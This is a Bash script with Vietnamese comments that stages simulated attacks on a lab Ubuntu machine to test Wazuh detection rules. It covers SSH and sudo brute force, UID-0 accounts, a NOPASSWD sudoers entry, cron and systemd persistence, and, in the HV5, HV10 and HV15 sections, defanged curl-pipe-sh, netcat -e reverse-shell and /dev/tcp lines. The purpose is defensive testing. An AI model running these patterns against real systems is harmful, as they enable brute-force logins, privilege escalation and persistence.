#!/usr/bin/env bash
# =====================================================================
# ubuntu-trigger.sh  (v2)  -  Tu dong sinh hanh vi kiem thu rule Wazuh
# May: ubuntu-lab (agent 014, 192.168.19.129, Ubuntu 24.04)
# CHI DUNG TRONG LAB. Payload vo hai.
#
# v2: dung EXPECT lai terminal that (go mat khau nhu nguoi) de tai hien
#     dung log ma rule can. Sua logic mat khau cho cac ca sudoers/su.
#
# Cach dung (root):
#   sudo ./ubuntu-trigger.sh prep     # tao tai khoan thu + cai sshpass, expect
#   sudo ./ubuntu-trigger.sh 13.1     # chay 1 ca
#   sudo ./ubuntu-trigger.sh hv13     # chay ca hanh vi
#   sudo ./ubuntu-trigger.sh all
#   sudo ./ubuntu-trigger.sh clean
#
# Dashboard:  agent.id: "014" and rule.id: <ID>
# =====================================================================
set -u

SELF_IP="192.168.19.129"
TESTPW="Lab@123456"
GAP=3
LOG="trigger-ubuntu-$(date +%Y%m%d-%H%M%S).csv"

if [ "$(id -u)" -ne 0 ]; then echo "Phai chay bang root: sudo $0 $*"; exit 1; fi

mark() {
  local t; t=$(date '+%Y-%m-%d %H:%M:%S')
  printf '\n>>> %s | [%s] rule mong doi: %s\n    %s\n' "$t" "$1" "$2" "$3"
  if [ ! -f "$LOG" ]; then echo '"thoi_gian","host","ca","rule_mong_doi","mo_ta"' > "$LOG"; fi
  printf '"%s","ubuntu-lab","%s","%s","%s"\n' "$t" "$1" "$2" "$3" >> "$LOG"
}
pause() { sleep "$GAP"; }

# chay mot kich ban expect duoi danh nghia <user> (qua pty that, khong can mat khau cua user do vi dang la root)
exp_as() { # <user> <expect-program>
  local u="$1" prog="$2"
  local f="/tmp/lt_$$_${RANDOM}.exp"
  printf '%s\n' "$prog" > "$f"; chmod 644 "$f"
  runuser -u "$u" -- expect -f "$f" >/dev/null 2>&1
  rm -f "$f"
}

# =====================================================================
# CHUAN BI
# =====================================================================
do_prep() {
  echo "== Cai cong cu =="
  apt-get update -qq
  apt-get install -y -qq sshpass expect netcat-traditional >/dev/null 2>&1
  echo "== Tao tai khoan thu =="
  id labsudo     >/dev/null 2>&1 || useradd -m -s /bin/bash -G sudo labsudo
  id labnosudo   >/dev/null 2>&1 || useradd -m -s /bin/bash labnosudo
  id labrestrict >/dev/null 2>&1 || useradd -m -s /bin/bash labrestrict
  echo "labsudo:$TESTPW"     | chpasswd
  echo "labnosudo:$TESTPW"   | chpasswd
  echo "labrestrict:$TESTPW" | chpasswd
  echo 'labrestrict ALL=(ALL) /usr/bin/ls' > /etc/sudoers.d/labrestrict
  chmod 440 /etc/sudoers.d/labrestrict
  # dam bao sshd cho dang nhap bang mat khau (can cho brute force)
  if ! grep -qE '^\s*PasswordAuthentication\s+yes' /etc/ssh/sshd_config; then
    sed -i 's/^#\?\s*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
    systemctl restart ssh 2>/dev/null
  fi
  visudo -c >/dev/null && echo "sudoers OK. Xong chuan bi."
}
do_clean() {
  rm -f /etc/sudoers.d/labrestrict
  userdel -r labsudo 2>/dev/null; userdel -r labnosudo 2>/dev/null; userdel -r labrestrict 2>/dev/null
  echo "Da xoa tai khoan thu."
}

# =====================================================================
# HV13 - sudo/su that bai  (EXPECT = pty that)
# =====================================================================
# gui sai mat khau N lan roi bo cuoc (Ctrl-C) -> sinh "N incorrect password attempts"
c_13_1(){ mark 13.1 100500 "sudo sai 1 lan roi bo cuoc (labsudo)"
  exp_as labsudo 'spawn sudo -k id
expect "assword"
send "saibet1\r"
expect "assword"
send "\003"
expect eof'; }

c_13_2(){ mark 13.2 100501 "sudo sai 3 lan trong 1 lenh (labsudo)"
  exp_as labsudo 'spawn sudo -k id
expect "assword"
send "saibet1\r"
expect "assword"
send "saibet2\r"
expect "assword"
send "saibet3\r"
expect eof'; }

c_13_3(){ mark 13.3 100504 "4 luot sudo that bai trong 5 phut (labsudo)"
  for i in 1 2 3 4; do c_once_fail labsudo; sleep 2; done; }
c_once_fail(){ exp_as "$1" 'spawn sudo -k id
expect "assword"
send "saibet\r"
expect "assword"
send "\003"
expect eof'; }

c_13_4(){ mark 13.4 "100502,100505" "labnosudo go DUNG mat khau nhung khong co quyen sudo (3 lan)"
  for i in 1 2 3; do
    exp_as labnosudo "spawn sudo -k id
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
    sleep 2
  done; }

c_13_5(){ mark 13.5 100503 "labrestrict chay lenh khong duoc phep (cat /etc/shadow)"
  exp_as labrestrict "spawn sudo -k cat /etc/shadow
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }

c_13_6(){ mark 13.6 100506 "tai khoan dich vu www-data thu sudo"
  exp_as www-data 'spawn sudo -k id
expect "assword"
send "saibet\r"
expect "assword"
send "\003"
expect eof'; }

c_13_7(){ mark 13.7 100507 "sudo thanh cong ngay sau chuoi that bai (labsudo)"
  c_once_fail labsudo; sleep 1; c_once_fail labsudo; sleep 1
  exp_as labsudo "spawn sudo -k id
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }

c_13_8(){ mark 13.8 "100508,100509,100510" "su that bai: 1 lan len labsudo + 5 lan len root"
  exp_as labnosudo 'spawn su - labsudo
expect "assword"
send "saibet\r"
expect eof'
  for i in 1 2 3 4 5; do
    exp_as labnosudo 'spawn su - root
expect "assword"
send "saibet\r"
expect eof'
    sleep 1
  done; }

hv13(){ c_13_1;pause;c_13_2;pause;c_13_3;pause;c_13_4;pause;c_13_5;pause;c_13_6;pause;c_13_7;pause;c_13_8; }

# =====================================================================
# HV1 ca 1.5 / HV12 - SSH brute force (sshpass, tai khoan LOCAL labsudo)
# srcip = 192.168.19.129 (tu-thu).
# =====================================================================
ssh_fail(){ sshpass -p "sai$RANDOM" ssh -o PreferredAuthentications=password \
  -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@$SELF_IP" true >/dev/null 2>&1; }
c_1_5(){ mark 1.5 "100112,100114" "12 lan SSH sai tai khoan labsudo (lan 10 -> 100114)"
  for i in $(seq 1 12); do ssh_fail labsudo; done; }
c_12_1(){ mark 12.1 100487 "6 lan SSH root sai mat khau (100480/100482 la rule dang nhap root THANH CONG, khong ap dung)"
  for i in $(seq 1 6); do ssh_fail root; sleep 1; done; }
hv1_ssh(){ c_1_5; }
hv12(){ c_12_1; }

# =====================================================================
# HV5 Linux
# =====================================================================
c_5_11(){ mark 5.11 100357 "sudo chay chuoi curl|sh (vo hai, ket noi bi tu choi)"
  exp_as labsudo "spawn sudo -k sh -c {curl -s http://127.0.0.1:9/x | sh}
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }
c_5_12(){ mark 5.12 "100356,100357" "nc.traditional -e (reverse shell gia) + qua sudo"
  nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1
  exp_as labsudo "spawn sudo -k nc.traditional -e /bin/true 127.0.0.1 9
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }
hv5_linux(){ c_5_11; pause; c_5_12; }

# =====================================================================
# HV2 Linux - SSH dang nhap thanh cong sau nhieu lan sai (100123-100125)
# =====================================================================
ssh_ok(){ sshpass -p "$2" ssh -o PreferredAuthentications=password \
  -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@$SELF_IP" true >/dev/null 2>&1; }

c_2_4(){ mark 2.4 100123 "6 lan SSH sai roi dang nhap dung (labsudo)"
  for i in 1 2 3 4 5 6; do ssh_fail labsudo; sleep 1; done
  ssh_ok labsudo "$TESTPW"; }

c_2_5(){ mark 2.5 "100124,100125" "11 lan SSH sai roi dang nhap dung (labnosudo)"
  for i in $(seq 1 11); do ssh_fail labnosudo; done
  sleep 1
  ssh_ok labnosudo "$TESTPW"; }

hv2_linux(){ c_2_4; pause; c_2_5; }

# =====================================================================
# HV3 Linux - tao/sua/xoa tai khoan (100311-100315)
# =====================================================================
c_3_9(){ mark 3.9 "100311,100312" "tao tai khoan UID 0 (labuid0) va tai khoan trong nhom sudo (labadm1)"
  useradd -o -u 0 -g 0 -M -N labuid0 2>/dev/null
  sleep 1
  useradd -M -G sudo labadm1 2>/dev/null
  sleep 1
  userdel -f labuid0 2>/dev/null
  userdel labadm1 2>/dev/null; }

c_3_10(){ mark 3.10 100313 "doi UID tai khoan co san thanh 0 (labmod0)"
  useradd -M labmod0 2>/dev/null
  sleep 1
  usermod -o -u 0 labmod0 2>/dev/null
  sleep 1
  userdel -f labmod0 2>/dev/null; }

c_3_11(){ mark 3.11 "100314,100315" "xoa 5 tai khoan Linux trong 10 phut (labdel1..5)"
  for i in 1 2 3 4 5; do useradd -M "labdel$i" 2>/dev/null; done
  sleep 1
  for i in 1 2 3 4 5; do userdel "labdel$i" 2>/dev/null; sleep 1; done; }

hv3_linux(){ c_3_9; pause; c_3_10; pause; c_3_11; }

# =====================================================================
# HV4 Linux - them vao nhom dac quyen & sua sudoers (100328-100332)
# =====================================================================
c_4_6(){ mark 4.6 "100328,100329,100330" "them labnosudo vao sudo bang gpasswd, usermod va qua sudo"
  gpasswd -a labnosudo sudo >/dev/null 2>&1
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1
  sleep 1
  usermod -aG sudo labnosudo >/dev/null 2>&1
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1
  sleep 1
  exp_as labsudo "spawn sudo -k usermod -aG sudo labnosudo
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1; }

c_4_7(){ mark 4.7 "100331,100332" "tao file trong /etc/sudoers.d co NOPASSWD: ALL (FIM)"
  echo 'labnosudo ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/labtest_nopw
  chmod 440 /etc/sudoers.d/labtest_nopw
  sleep 5
  rm -f /etc/sudoers.d/labtest_nopw; }

hv4_linux(){ c_4_6; pause; c_4_7; }

# =====================================================================
# HV10 Linux - cron va systemd unit (FIM: 100457, 100458)
# =====================================================================
c_10_8(){ mark 10.8 100457 "them file cron va unit systemd (FIM)"
  printf '# lab test\n* * * * * root /bin/true\n' > /etc/cron.d/lab_test_job
  printf '[Unit]\nDescription=Lab Test\n[Service]\nExecStart=/bin/true\n' > /etc/systemd/system/lab-test.service
  sleep 5
  rm -f /etc/cron.d/lab_test_job /etc/systemd/system/lab-test.service; }

c_10_9(){ mark 10.9 100458 "them cron co lenh tai curl|sh (FIM report_changes)"
  printf '# lab test\n0 0 1 1 * root curl -s http://127.0.0.1:9/x | sh\n' > /etc/cron.d/lab_dl_job
  sleep 5
  rm -f /etc/cron.d/lab_dl_job; }

hv10_linux(){ c_10_8; pause; c_10_9; }

# =====================================================================
# HV12 Linux (bo sung) - SSH root THANH CONG (tam bat PermitRootLogin roi tat)
# =====================================================================
root_ssh_enable() {
  cp /etc/ssh/sshd_config /tmp/sshd_config.lab.bak
  echo "root:$TESTPW" | chpasswd
  if grep -qE '^\s*#?\s*PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i 's/^\s*#\?\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
  else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
  fi
  systemctl restart ssh 2>/dev/null
  sleep 1
}
root_ssh_restore() {
  if [ -f /tmp/sshd_config.lab.bak ]; then
    mv /tmp/sshd_config.lab.bak /etc/ssh/sshd_config
    systemctl restart ssh 2>/dev/null
  fi
  passwd -l root >/dev/null 2>&1
}

c_12_2(){ mark 12.2 "100480,100481,100482,100486" "SSH root dang nhap THANH CONG bang mat khau (tam bat roi tat)"
  root_ssh_enable
  ssh_ok root "$TESTPW"
  sleep 1
  root_ssh_restore; }

c_12_3(){ mark 12.3 100489 "SSH root sai 3 lan roi dang nhap THANH CONG bang mat khau"
  root_ssh_enable
  for i in 1 2 3; do ssh_fail root; sleep 1; done
  ssh_ok root "$TESTPW"
  sleep 1
  root_ssh_restore; }

hv12_ok(){ c_12_2; pause; c_12_3; }

# =====================================================================
# HV15 Linux - ket noi ra ngoai & reverse shell qua auditd (100549-100552)
# =====================================================================
c_15_8(){ mark 15.8 "100549,100550,100551,100552" "bash + binary trong /tmp ket noi ra ngoai + chuoi reverse shell (auditd)"
  bash -c 'timeout 3 bash -c "exec 3<>/dev/tcp/1.1.1.1/443" 2>/dev/null || true'
  cp /usr/bin/curl /tmp/lab_tmp_curl 2>/dev/null && chmod +x /tmp/lab_tmp_curl
  /tmp/lab_tmp_curl -s -m 3 https://1.1.1.1 -o /dev/null 2>/dev/null || true
  rm -f /tmp/lab_tmp_curl
  bash -c 'echo "/dev/tcp/1.1.1.1/4444" >/dev/null'
  nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1 || true; }

hv15_linux(){ c_15_8; }

# =====================================================================
linux_extra(){ hv2_linux; pause; hv3_linux; pause; hv4_linux; pause; hv10_linux; pause; hv12_ok; pause; hv15_linux; }
run_all(){ hv13; pause; hv1_ssh; pause; hv12; pause; hv5_linux; pause; linux_extra; }

case "${1:-}" in
  prep) do_prep ;; clean) do_clean ;; all) run_all ;; linux_extra) linux_extra ;;
  hv13) hv13 ;; hv12) hv12 ;; hv12_ok) hv12_ok ;; hv5) hv5_linux ;;
  hv2) hv2_linux ;; hv3) hv3_linux ;; hv4) hv4_linux ;; hv10) hv10_linux ;; hv15) hv15_linux ;;
  1.5) c_1_5 ;; 2.4) c_2_4 ;; 2.5) c_2_5 ;;
  3.9) c_3_9 ;; 3.10) c_3_10 ;; 3.11) c_3_11 ;;
  4.6) c_4_6 ;; 4.7) c_4_7 ;;
  5.11) c_5_11 ;; 5.12) c_5_12 ;;
  10.8) c_10_8 ;; 10.9) c_10_9 ;;
  12.1) c_12_1 ;; 12.2) c_12_2 ;; 12.3) c_12_3 ;;
  13.1) c_13_1 ;; 13.2) c_13_2 ;; 13.3) c_13_3 ;; 13.4) c_13_4 ;;
  13.5) c_13_5 ;; 13.6) c_13_6 ;; 13.7) c_13_7 ;; 13.8) c_13_8 ;;
  15.8) c_15_8 ;;
  *) echo "Dung: sudo $0 {prep|clean|all|linux_extra|hv2|hv3|hv4|hv5|hv10|hv12|hv12_ok|hv13|hv15|<ca>}"; exit 1 ;;
esac
[ -f "$LOG" ] && echo && echo "== Bang chung: $(pwd)/$LOG =="
echo 'Dashboard: agent.id: "014" and rule.id: <ID>  (Last 15 minutes)'
